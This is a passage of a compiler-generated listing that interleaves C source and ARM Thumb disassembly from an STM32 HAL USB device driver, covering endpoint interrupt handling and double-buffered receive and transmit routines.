            if ((wEPVal & USB_EP_DTOG_TX) != 0U)
 8002cb4:	f8b7 304a 	ldrh.w	r3, [r7, #74]	; 0x4a
 8002cb8:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8002cbc:	2b00      	cmp	r3, #0
 8002cbe:	d046      	beq.n	8002d4e <PCD_EP_ISR_Handler+0x630>
            {
              PCD_SET_EP_DBUF0_CNT(hpcd->Instance, ep->num, ep->is_in, 0U);
 8002cc0:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002cc2:	785b      	ldrb	r3, [r3, #1]
 8002cc4:	2b00      	cmp	r3, #0
 8002cc6:	d126      	bne.n	8002d16 <PCD_EP_ISR_Handler+0x5f8>
 8002cc8:	687b      	ldr	r3, [r7, #4]
 8002cca:	681b      	ldr	r3, [r3, #0]
 8002ccc:	627b      	str	r3, [r7, #36]	; 0x24
 8002cce:	687b      	ldr	r3, [r7, #4]
 8002cd0:	681b      	ldr	r3, [r3, #0]
 8002cd2:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002cd6:	b29b      	uxth	r3, r3
 8002cd8:	461a      	mov	r2, r3
 8002cda:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8002cdc:	4413      	add	r3, r2
 8002cde:	627b      	str	r3, [r7, #36]	; 0x24
 8002ce0:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002ce2:	781b      	ldrb	r3, [r3, #0]
 8002ce4:	00da      	lsls	r2, r3, #3
 8002ce6:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8002ce8:	4413      	add	r3, r2
 8002cea:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8002cee:	623b      	str	r3, [r7, #32]
 8002cf0:	6a3b      	ldr	r3, [r7, #32]
 8002cf2:	881b      	ldrh	r3, [r3, #0]
 8002cf4:	b29b      	uxth	r3, r3
 8002cf6:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8002cfa:	b29a      	uxth	r2, r3
 8002cfc:	6a3b      	ldr	r3, [r7, #32]
 8002cfe:	801a      	strh	r2, [r3, #0]
 8002d00:	6a3b      	ldr	r3, [r7, #32]
 8002d02:	881b      	ldrh	r3, [r3, #0]
 8002d04:	b29b      	uxth	r3, r3
 8002d06:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8002d0a:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8002d0e:	b29a      	uxth	r2, r3
 8002d10:	6a3b      	ldr	r3, [r7, #32]
 8002d12:	801a      	strh	r2, [r3, #0]
 8002d14:	e061      	b.n	8002dda <PCD_EP_ISR_Handler+0x6bc>
 8002d16:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002d18:	785b      	ldrb	r3, [r3, #1]
 8002d1a:	2b01      	cmp	r3, #1
 8002d1c:	d15d      	bne.n	8002dda <PCD_EP_ISR_Handler+0x6bc>
 8002d1e:	687b      	ldr	r3, [r7, #4]
 8002d20:	681b      	ldr	r3, [r3, #0]
 8002d22:	62fb      	str	r3, [r7, #44]	; 0x2c
 8002d24:	687b      	ldr	r3, [r7, #4]
 8002d26:	681b      	ldr	r3, [r3, #0]
 8002d28:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002d2c:	b29b      	uxth	r3, r3
 8002d2e:	461a      	mov	r2, r3
 8002d30:	6afb      	ldr	r3, [r7, #44]	; 0x2c
 8002d32:	4413      	add	r3, r2
 8002d34:	62fb      	str	r3, [r7, #44]	; 0x2c
 8002d36:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002d38:	781b      	ldrb	r3, [r3, #0]
 8002d3a:	00da      	lsls	r2, r3, #3
 8002d3c:	6afb      	ldr	r3, [r7, #44]	; 0x2c
 8002d3e:	4413      	add	r3, r2
 8002d40:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8002d44:	62bb      	str	r3, [r7, #40]	; 0x28
 8002d46:	6abb      	ldr	r3, [r7, #40]	; 0x28
 8002d48:	2200      	movs	r2, #0
 8002d4a:	801a      	strh	r2, [r3, #0]
 8002d4c:	e045      	b.n	8002dda <PCD_EP_ISR_Handler+0x6bc>
            }
            else
            {
              PCD_SET_EP_DBUF1_CNT(hpcd->Instance, ep->num, ep->is_in, 0U);
 8002d4e:	687b      	ldr	r3, [r7, #4]
 8002d50:	681b      	ldr	r3, [r3, #0]
 8002d52:	63fb      	str	r3, [r7, #60]	; 0x3c
 8002d54:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002d56:	785b      	ldrb	r3, [r3, #1]
 8002d58:	2b00      	cmp	r3, #0
 8002d5a:	d126      	bne.n	8002daa <PCD_EP_ISR_Handler+0x68c>
 8002d5c:	687b      	ldr	r3, [r7, #4]
 8002d5e:	681b      	ldr	r3, [r3, #0]
 8002d60:	637b      	str	r3, [r7, #52]	; 0x34
 8002d62:	687b      	ldr	r3, [r7, #4]
 8002d64:	681b      	ldr	r3, [r3, #0]
 8002d66:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002d6a:	b29b      	uxth	r3, r3
 8002d6c:	461a      	mov	r2, r3
 8002d6e:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 8002d70:	4413      	add	r3, r2
 8002d72:	637b      	str	r3, [r7, #52]	; 0x34
 8002d74:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002d76:	781b      	ldrb	r3, [r3, #0]
 8002d78:	00da      	lsls	r2, r3, #3
 8002d7a:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 8002d7c:	4413      	add	r3, r2
 8002d7e:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8002d82:	633b      	str	r3, [r7, #48]	; 0x30
 8002d84:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8002d86:	881b      	ldrh	r3, [r3, #0]
 8002d88:	b29b      	uxth	r3, r3
 8002d8a:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8002d8e:	b29a      	uxth	r2, r3
 8002d90:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8002d92:	801a      	strh	r2, [r3, #0]
 8002d94:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8002d96:	881b      	ldrh	r3, [r3, #0]
 8002d98:	b29b      	uxth	r3, r3
 8002d9a:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8002d9e:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8002da2:	b29a      	uxth	r2, r3
 8002da4:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8002da6:	801a      	strh	r2, [r3, #0]
 8002da8:	e017      	b.n	8002dda <PCD_EP_ISR_Handler+0x6bc>
 8002daa:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002dac:	785b      	ldrb	r3, [r3, #1]
 8002dae:	2b01      	cmp	r3, #1
 8002db0:	d113      	bne.n	8002dda <PCD_EP_ISR_Handler+0x6bc>
 8002db2:	687b      	ldr	r3, [r7, #4]
 8002db4:	681b      	ldr	r3, [r3, #0]
 8002db6:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002dba:	b29b      	uxth	r3, r3
 8002dbc:	461a      	mov	r2, r3
 8002dbe:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 8002dc0:	4413      	add	r3, r2
 8002dc2:	63fb      	str	r3, [r7, #60]	; 0x3c
 8002dc4:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002dc6:	781b      	ldrb	r3, [r3, #0]
 8002dc8:	00da      	lsls	r2, r3, #3
 8002dca:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 8002dcc:	4413      	add	r3, r2
 8002dce:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8002dd2:	63bb      	str	r3, [r7, #56]	; 0x38
 8002dd4:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8002dd6:	2200      	movs	r2, #0
 8002dd8:	801a      	strh	r2, [r3, #0]

          /* TX COMPLETE */
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
          hpcd->DataInStageCallback(hpcd, ep->num);
#else
          HAL_PCD_DataInStageCallback(hpcd, ep->num);
 8002dda:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002ddc:	781b      	ldrb	r3, [r3, #0]
 8002dde:	4619      	mov	r1, r3
 8002de0:	6878      	ldr	r0, [r7, #4]
 8002de2:	f009 fe7c 	bl	800cade <HAL_PCD_DataInStageCallback>
 8002de6:	e051      	b.n	8002e8c <PCD_EP_ISR_Handler+0x76e>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
        }
        else
        {
          /* Manage Single Buffer Transaction */
          if ((wEPVal & USB_EP_KIND) == 0U)
 8002de8:	f8b7 304a 	ldrh.w	r3, [r7, #74]	; 0x4a
 8002dec:	f403 7380 	and.w	r3, r3, #256	; 0x100
 8002df0:	2b00      	cmp	r3, #0
 8002df2:	d144      	bne.n	8002e7e <PCD_EP_ISR_Handler+0x760>
          {
            /* multi-packet on the NON control IN endpoint */
            TxPctSize = (uint16_t)PCD_GET_EP_TX_CNT(hpcd->Instance, ep->num);
 8002df4:	687b      	ldr	r3, [r7, #4]
 8002df6:	681b      	ldr	r3, [r3, #0]
 8002df8:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002dfc:	b29b      	uxth	r3, r3
 8002dfe:	461a      	mov	r2, r3
 8002e00:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002e02:	781b      	ldrb	r3, [r3, #0]
 8002e04:	00db      	lsls	r3, r3, #3
 8002e06:	4413      	add	r3, r2
 8002e08:	687a      	ldr	r2, [r7, #4]
 8002e0a:	6812      	ldr	r2, [r2, #0]
 8002e0c:	4413      	add	r3, r2
 8002e0e:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8002e12:	881b      	ldrh	r3, [r3, #0]
 8002e14:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8002e18:	f8a7 3040 	strh.w	r3, [r7, #64]	; 0x40

            if (ep->xfer_len > TxPctSize)
 8002e1c:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002e1e:	699a      	ldr	r2, [r3, #24]
 8002e20:	f8b7 3040 	ldrh.w	r3, [r7, #64]	; 0x40
 8002e24:	429a      	cmp	r2, r3
 8002e26:	d907      	bls.n	8002e38 <PCD_EP_ISR_Handler+0x71a>
            {
              ep->xfer_len -= TxPctSize;
 8002e28:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002e2a:	699a      	ldr	r2, [r3, #24]
 8002e2c:	f8b7 3040 	ldrh.w	r3, [r7, #64]	; 0x40
 8002e30:	1ad2      	subs	r2, r2, r3
 8002e32:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002e34:	619a      	str	r2, [r3, #24]
 8002e36:	e002      	b.n	8002e3e <PCD_EP_ISR_Handler+0x720>
            }
            else
            {
              ep->xfer_len = 0U;
 8002e38:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002e3a:	2200      	movs	r2, #0
 8002e3c:	619a      	str	r2, [r3, #24]
            }

            /* Zero Length Packet? */
            if (ep->xfer_len == 0U)
 8002e3e:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002e40:	699b      	ldr	r3, [r3, #24]
 8002e42:	2b00      	cmp	r3, #0
 8002e44:	d106      	bne.n	8002e54 <PCD_EP_ISR_Handler+0x736>
            {
              /* TX COMPLETE */
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
              hpcd->DataInStageCallback(hpcd, ep->num);
#else
              HAL_PCD_DataInStageCallback(hpcd, ep->num);
 8002e46:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002e48:	781b      	ldrb	r3, [r3, #0]
 8002e4a:	4619      	mov	r1, r3
 8002e4c:	6878      	ldr	r0, [r7, #4]
 8002e4e:	f009 fe46 	bl	800cade <HAL_PCD_DataInStageCallback>
 8002e52:	e01b      	b.n	8002e8c <PCD_EP_ISR_Handler+0x76e>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
            }
            else
            {
              /* Transfer is not yet Done */
              ep->xfer_buff += TxPctSize;
 8002e54:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002e56:	695a      	ldr	r2, [r3, #20]
 8002e58:	f8b7 3040 	ldrh.w	r3, [r7, #64]	; 0x40
 8002e5c:	441a      	add	r2, r3
 8002e5e:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002e60:	615a      	str	r2, [r3, #20]
              ep->xfer_count += TxPctSize;
 8002e62:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002e64:	69da      	ldr	r2, [r3, #28]
 8002e66:	f8b7 3040 	ldrh.w	r3, [r7, #64]	; 0x40
 8002e6a:	441a      	add	r2, r3
 8002e6c:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002e6e:	61da      	str	r2, [r3, #28]
              (void)USB_EPStartXfer(hpcd->Instance, ep);
 8002e70:	687b      	ldr	r3, [r7, #4]
 8002e72:	681b      	ldr	r3, [r3, #0]
 8002e74:	6d79      	ldr	r1, [r7, #84]	; 0x54
 8002e76:	4618      	mov	r0, r3
 8002e78:	f003 fec3 	bl	8006c02 <USB_EPStartXfer>
 8002e7c:	e006      	b.n	8002e8c <PCD_EP_ISR_Handler+0x76e>
          }
#if (USE_USB_DOUBLE_BUFFER == 1U)
          /* Double Buffer bulk IN (bulk transfer Len > Ep_Mps) */
          else
          {
            (void)HAL_PCD_EP_DB_Transmit(hpcd, ep, wEPVal);
 8002e7e:	f8b7 304a 	ldrh.w	r3, [r7, #74]	; 0x4a
 8002e82:	461a      	mov	r2, r3
 8002e84:	6d79      	ldr	r1, [r7, #84]	; 0x54
 8002e86:	6878      	ldr	r0, [r7, #4]
 8002e88:	f000 f917 	bl	80030ba <HAL_PCD_EP_DB_Transmit>
  while ((hpcd->Instance->ISTR & USB_ISTR_CTR) != 0U)
 8002e8c:	687b      	ldr	r3, [r7, #4]
 8002e8e:	681b      	ldr	r3, [r3, #0]
 8002e90:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 8002e94:	b29b      	uxth	r3, r3
 8002e96:	b21b      	sxth	r3, r3
 8002e98:	2b00      	cmp	r3, #0
 8002e9a:	f6ff ac45 	blt.w	8002728 <PCD_EP_ISR_Handler+0xa>
        }
      }
    }
  }

  return HAL_OK;
 8002e9e:	2300      	movs	r3, #0
}
 8002ea0:	4618      	mov	r0, r3
 8002ea2:	3758      	adds	r7, #88	; 0x58
 8002ea4:	46bd      	mov	sp, r7
 8002ea6:	bd80      	pop	{r7, pc}

08002ea8 <HAL_PCD_EP_DB_Receive>:
  * @param  wEPVal Last snapshot of EPRx register value taken in ISR
  * @retval HAL status
  */
static uint16_t HAL_PCD_EP_DB_Receive(PCD_HandleTypeDef *hpcd,
                                      PCD_EPTypeDef *ep, uint16_t wEPVal)
{
 8002ea8:	b580      	push	{r7, lr}
 8002eaa:	b088      	sub	sp, #32
 8002eac:	af00      	add	r7, sp, #0
 8002eae:	60f8      	str	r0, [r7, #12]
 8002eb0:	60b9      	str	r1, [r7, #8]
 8002eb2:	4613      	mov	r3, r2
 8002eb4:	80fb      	strh	r3, [r7, #6]
  uint16_t count;

  /* Manage Buffer0 OUT */
  if ((wEPVal & USB_EP_DTOG_RX) != 0U)
 8002eb6:	88fb      	ldrh	r3, [r7, #6]
 8002eb8:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 8002ebc:	2b00      	cmp	r3, #0
 8002ebe:	d07c      	beq.n	8002fba <HAL_PCD_EP_DB_Receive+0x112>
  {
    /* Get count of received Data on buffer0 */
    count = (uint16_t)PCD_GET_EP_DBUF0_CNT(hpcd->Instance, ep->num);
 8002ec0:	68fb      	ldr	r3, [r7, #12]
 8002ec2:	681b      	ldr	r3, [r3, #0]
 8002ec4:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002ec8:	b29b      	uxth	r3, r3
 8002eca:	461a      	mov	r2, r3
 8002ecc:	68bb      	ldr	r3, [r7, #8]
 8002ece:	781b      	ldrb	r3, [r3, #0]
 8002ed0:	00db      	lsls	r3, r3, #3
 8002ed2:	4413      	add	r3, r2
 8002ed4:	68fa      	ldr	r2, [r7, #12]
 8002ed6:	6812      	ldr	r2, [r2, #0]
 8002ed8:	4413      	add	r3, r2
 8002eda:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8002ede:	881b      	ldrh	r3, [r3, #0]
 8002ee0:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8002ee4:	837b      	strh	r3, [r7, #26]

    if (ep->xfer_len >= count)
 8002ee6:	68bb      	ldr	r3, [r7, #8]
 8002ee8:	699a      	ldr	r2, [r3, #24]
 8002eea:	8b7b      	ldrh	r3, [r7, #26]
 8002eec:	429a      	cmp	r2, r3
 8002eee:	d306      	bcc.n	8002efe <HAL_PCD_EP_DB_Receive+0x56>
    {
      ep->xfer_len -= count;
 8002ef0:	68bb      	ldr	r3, [r7, #8]
 8002ef2:	699a      	ldr	r2, [r3, #24]
 8002ef4:	8b7b      	ldrh	r3, [r7, #26]
 8002ef6:	1ad2      	subs	r2, r2, r3
 8002ef8:	68bb      	ldr	r3, [r7, #8]
 8002efa:	619a      	str	r2, [r3, #24]
 8002efc:	e002      	b.n	8002f04 <HAL_PCD_EP_DB_Receive+0x5c>
    }
    else
    {
      ep->xfer_len = 0U;
 8002efe:	68bb      	ldr	r3, [r7, #8]
 8002f00:	2200      	movs	r2, #0
 8002f02:	619a      	str	r2, [r3, #24]
    }

    if (ep->xfer_len == 0U)
 8002f04:	68bb      	ldr	r3, [r7, #8]
 8002f06:	699b      	ldr	r3, [r3, #24]
 8002f08:	2b00      	cmp	r3, #0
 8002f0a:	d123      	bne.n	8002f54 <HAL_PCD_EP_DB_Receive+0xac>
    {
      /* set NAK to OUT endpoint since double buffer is enabled */
      PCD_SET_EP_RX_STATUS(hpcd->Instance, ep->num, USB_EP_RX_NAK);
 8002f0c:	68fb      	ldr	r3, [r7, #12]
 8002f0e:	681b      	ldr	r3, [r3, #0]
 8002f10:	461a      	mov	r2, r3
 8002f12:	68bb      	ldr	r3, [r7, #8]
 8002f14:	781b      	ldrb	r3, [r3, #0]
 8002f16:	009b      	lsls	r3, r3, #2
 8002f18:	4413      	add	r3, r2
 8002f1a:	881b      	ldrh	r3, [r3, #0]
 8002f1c:	b29b      	uxth	r3, r3
 8002f1e:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 8002f22:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8002f26:	833b      	strh	r3, [r7, #24]
 8002f28:	8b3b      	ldrh	r3, [r7, #24]
 8002f2a:	f483 5300 	eor.w	r3, r3, #8192	; 0x2000
 8002f2e:	833b      	strh	r3, [r7, #24]
 8002f30:	68fb      	ldr	r3, [r7, #12]
 8002f32:	681b      	ldr	r3, [r3, #0]
 8002f34:	461a      	mov	r2, r3
 8002f36:	68bb      	ldr	r3, [r7, #8]
 8002f38:	781b      	ldrb	r3, [r3, #0]
 8002f3a:	009b      	lsls	r3, r3, #2
 8002f3c:	441a      	add	r2, r3
 8002f3e:	8b3b      	ldrh	r3, [r7, #24]
 8002f40:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8002f44:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8002f48:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8002f4c:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8002f50:	b29b      	uxth	r3, r3
 8002f52:	8013      	strh	r3, [r2, #0]
    }

    /* Check if Buffer1 is in blocked state which requires to toggle */
    if ((wEPVal & USB_EP_DTOG_TX) != 0U)
 8002f54:	88fb      	ldrh	r3, [r7, #6]
 8002f56:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8002f5a:	2b00      	cmp	r3, #0
 8002f5c:	d01f      	beq.n	8002f9e <HAL_PCD_EP_DB_Receive+0xf6>
    {
      PCD_FREE_USER_BUFFER(hpcd->Instance, ep->num, 0U);
 8002f5e:	68fb      	ldr	r3, [r7, #12]
 8002f60:	681b      	ldr	r3, [r3, #0]
 8002f62:	461a      	mov	r2, r3
 8002f64:	68bb      	ldr	r3, [r7, #8]
 8002f66:	781b      	ldrb	r3, [r3, #0]
 8002f68:	009b      	lsls	r3, r3, #2
 8002f6a:	4413      	add	r3, r2
 8002f6c:	881b      	ldrh	r3, [r3, #0]
 8002f6e:	b29b      	uxth	r3, r3
 8002f70:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8002f74:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8002f78:	82fb      	strh	r3, [r7, #22]
 8002f7a:	68fb      	ldr	r3, [r7, #12]
 8002f7c:	681b      	ldr	r3, [r3, #0]
 8002f7e:	461a      	mov	r2, r3
 8002f80:	68bb      	ldr	r3, [r7, #8]
 8002f82:	781b      	ldrb	r3, [r3, #0]
 8002f84:	009b      	lsls	r3, r3, #2
 8002f86:	441a      	add	r2, r3
 8002f88:	8afb      	ldrh	r3, [r7, #22]
 8002f8a:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8002f8e:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8002f92:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8002f96:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 8002f9a:	b29b      	uxth	r3, r3
 8002f9c:	8013      	strh	r3, [r2, #0]
    }

    if (count != 0U)
 8002f9e:	8b7b      	ldrh	r3, [r7, #26]
 8002fa0:	2b00      	cmp	r3, #0
 8002fa2:	f000 8085 	beq.w	80030b0 <HAL_PCD_EP_DB_Receive+0x208>
    {
      USB_ReadPMA(hpcd->Instance, ep->xfer_buff, ep->pmaaddr0, count);
 8002fa6:	68fb      	ldr	r3, [r7, #12]
 8002fa8:	6818      	ldr	r0, [r3, #0]
 8002faa:	68bb      	ldr	r3, [r7, #8]
 8002fac:	6959      	ldr	r1, [r3, #20]
 8002fae:	68bb      	ldr	r3, [r7, #8]
 8002fb0:	891a      	ldrh	r2, [r3, #8]
 8002fb2:	8b7b      	ldrh	r3, [r7, #26]
 8002fb4:	f005 fb73 	bl	800869e <USB_ReadPMA>
 8002fb8:	e07a      	b.n	80030b0 <HAL_PCD_EP_DB_Receive+0x208>
  }
  /* Manage Buffer 1 DTOG_RX=0 */
  else
  {
    /* Get count of received data */
    count = (uint16_t)PCD_GET_EP_DBUF1_CNT(hpcd->Instance, ep->num);
 8002fba:	68fb      	ldr	r3, [r7, #12]
 8002fbc:	681b      	ldr	r3, [r3, #0]
 8002fbe:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002fc2:	b29b      	uxth	r3, r3
 8002fc4:	461a      	mov	r2, r3
 8002fc6:	68bb      	ldr	r3, [r7, #8]
 8002fc8:	781b      	ldrb	r3, [r3, #0]
 8002fca:	00db      	lsls	r3, r3, #3
 8002fcc:	4413      	add	r3, r2
 8002fce:	68fa      	ldr	r2, [r7, #12]
 8002fd0:	6812      	ldr	r2, [r2, #0]
 8002fd2:	4413      	add	r3, r2
 8002fd4:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8002fd8:	881b      	ldrh	r3, [r3, #0]
 8002fda:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8002fde:	837b      	strh	r3, [r7, #26]

    if (ep->xfer_len >= count)
 8002fe0:	68bb      	ldr	r3, [r7, #8]
 8002fe2:	699a      	ldr	r2, [r3, #24]
 8002fe4:	8b7b      	ldrh	r3, [r7, #26]
 8002fe6:	429a      	cmp	r2, r3
 8002fe8:	d306      	bcc.n	8002ff8 <HAL_PCD_EP_DB_Receive+0x150>
    {
      ep->xfer_len -= count;
 8002fea:	68bb      	ldr	r3, [r7, #8]
 8002fec:	699a      	ldr	r2, [r3, #24]
 8002fee:	8b7b      	ldrh	r3, [r7, #26]
 8002ff0:	1ad2      	subs	r2, r2, r3
 8002ff2:	68bb      	ldr	r3, [r7, #8]
 8002ff4:	619a      	str	r2, [r3, #24]
 8002ff6:	e002      	b.n	8002ffe <HAL_PCD_EP_DB_Receive+0x156>
    }
    else
    {
      ep->xfer_len = 0U;
 8002ff8:	68bb      	ldr	r3, [r7, #8]
 8002ffa:	2200      	movs	r2, #0
 8002ffc:	619a      	str	r2, [r3, #24]
    }

    if (ep->xfer_len == 0U)
 8002ffe:	68bb      	ldr	r3, [r7, #8]
 8003000:	699b      	ldr	r3, [r3, #24]
 8003002:	2b00      	cmp	r3, #0
 8003004:	d123      	bne.n	800304e <HAL_PCD_EP_DB_Receive+0x1a6>
    {
      /* set NAK on the current endpoint */
      PCD_SET_EP_RX_STATUS(hpcd->Instance, ep->num, USB_EP_RX_NAK);
 8003006:	68fb      	ldr	r3, [r7, #12]
 8003008:	681b      	ldr	r3, [r3, #0]
 800300a:	461a      	mov	r2, r3
 800300c:	68bb      	ldr	r3, [r7, #8]
 800300e:	781b      	ldrb	r3, [r3, #0]
 8003010:	009b      	lsls	r3, r3, #2
 8003012:	4413      	add	r3, r2
 8003014:	881b      	ldrh	r3, [r3, #0]
 8003016:	b29b      	uxth	r3, r3
 8003018:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 800301c:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8003020:	83fb      	strh	r3, [r7, #30]
 8003022:	8bfb      	ldrh	r3, [r7, #30]
 8003024:	f483 5300 	eor.w	r3, r3, #8192	; 0x2000
 8003028:	83fb      	strh	r3, [r7, #30]
 800302a:	68fb      	ldr	r3, [r7, #12]
 800302c:	681b      	ldr	r3, [r3, #0]
 800302e:	461a      	mov	r2, r3
 8003030:	68bb      	ldr	r3, [r7, #8]
 8003032:	781b      	ldrb	r3, [r3, #0]
 8003034:	009b      	lsls	r3, r3, #2
 8003036:	441a      	add	r2, r3
 8003038:	8bfb      	ldrh	r3, [r7, #30]
 800303a:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800303e:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8003042:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8003046:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 800304a:	b29b      	uxth	r3, r3
 800304c:	8013      	strh	r3, [r2, #0]
    }

    /*Need to FreeUser Buffer*/
    if ((wEPVal & USB_EP_DTOG_TX) == 0U)
 800304e:	88fb      	ldrh	r3, [r7, #6]
 8003050:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8003054:	2b00      	cmp	r3, #0
 8003056:	d11f      	bne.n	8003098 <HAL_PCD_EP_DB_Receive+0x1f0>
    {
      PCD_FREE_USER_BUFFER(hpcd->Instance, ep->num, 0U);
 8003058:	68fb      	ldr	r3, [r7, #12]
 800305a:	681b      	ldr	r3, [r3, #0]
 800305c:	461a      	mov	r2, r3
 800305e:	68bb      	ldr	r3, [r7, #8]
 8003060:	781b      	ldrb	r3, [r3, #0]
 8003062:	009b      	lsls	r3, r3, #2
 8003064:	4413      	add	r3, r2
 8003066:	881b      	ldrh	r3, [r3, #0]
 8003068:	b29b      	uxth	r3, r3
 800306a:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 800306e:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8003072:	83bb      	strh	r3, [r7, #28]
 8003074:	68fb      	ldr	r3, [r7, #12]
 8003076:	681b      	ldr	r3, [r3, #0]
 8003078:	461a      	mov	r2, r3
 800307a:	68bb      	ldr	r3, [r7, #8]
 800307c:	781b      	ldrb	r3, [r3, #0]
 800307e:	009b      	lsls	r3, r3, #2
 8003080:	441a      	add	r2, r3
 8003082:	8bbb      	ldrh	r3, [r7, #28]
 8003084:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8003088:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800308c:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8003090:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 8003094:	b29b      	uxth	r3, r3
 8003096:	8013      	strh	r3, [r2, #0]
    }

    if (count != 0U)
 8003098:	8b7b      	ldrh	r3, [r7, #26]
 800309a:	2b00      	cmp	r3, #0
 800309c:	d008      	beq.n	80030b0 <HAL_PCD_EP_DB_Receive+0x208>
    {
      USB_ReadPMA(hpcd->Instance, ep->xfer_buff, ep->pmaaddr1, count);
 800309e:	68fb      	ldr	r3, [r7, #12]
 80030a0:	6818      	ldr	r0, [r3, #0]
 80030a2:	68bb      	ldr	r3, [r7, #8]
 80030a4:	6959      	ldr	r1, [r3, #20]
 80030a6:	68bb      	ldr	r3, [r7, #8]
 80030a8:	895a      	ldrh	r2, [r3, #10]
 80030aa:	8b7b      	ldrh	r3, [r7, #26]
 80030ac:	f005 faf7 	bl	800869e <USB_ReadPMA>
    }
  }

  return count;
 80030b0:	8b7b      	ldrh	r3, [r7, #26]
}
 80030b2:	4618      	mov	r0, r3
 80030b4:	3720      	adds	r7, #32
 80030b6:	46bd      	mov	sp, r7
 80030b8:	bd80      	pop	{r7, pc}

080030ba <HAL_PCD_EP_DB_Transmit>:
  * @param  wEPVal Last snapshot of EPRx register value taken in ISR
  * @retval HAL status
  */
static HAL_StatusTypeDef HAL_PCD_EP_DB_Transmit(PCD_HandleTypeDef *hpcd,
                                                PCD_EPTypeDef *ep, uint16_t wEPVal)
{
 80030ba:	b580      	push	{r7, lr}
 80030bc:	b0a4      	sub	sp, #144	; 0x90
 80030be:	af00      	add	r7, sp, #0
 80030c0:	60f8      	str	r0, [r7, #12]
 80030c2:	60b9      	str	r1, [r7, #8]
 80030c4:	4613      	mov	r3, r2
 80030c6:	80fb      	strh	r3, [r7, #6]
  uint32_t len;
  uint16_t TxPctSize;

  /* Data Buffer0 ACK received */
  if ((wEPVal & USB_EP_DTOG_TX) != 0U)
